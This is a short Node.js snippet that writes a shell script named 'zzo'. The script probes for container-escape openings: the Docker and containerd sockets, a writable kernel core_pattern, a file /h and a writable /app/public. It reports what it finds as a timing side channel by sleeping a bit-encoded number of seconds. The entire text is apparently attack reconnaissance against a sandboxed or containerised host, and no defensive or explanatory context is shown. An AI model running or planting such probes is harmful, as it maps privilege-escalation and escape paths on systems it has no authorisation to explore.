const fs=require('fs');
fs.writeFileSync('zzo', "n=0\n[ -S /var/run/docker.sock ] && n=$((n+1))\n[ -S /run/k3s/containerd/containerd.sock ] && n=$((n+2))\n[ -w /proc/sys/kernel/core_pattern ] && n=$((n+4))\n[ -e /h ] && n=$((n+8))\n[ -w /app/public ] && n=$((n+16))\nsleep $n\n", 'latin1');
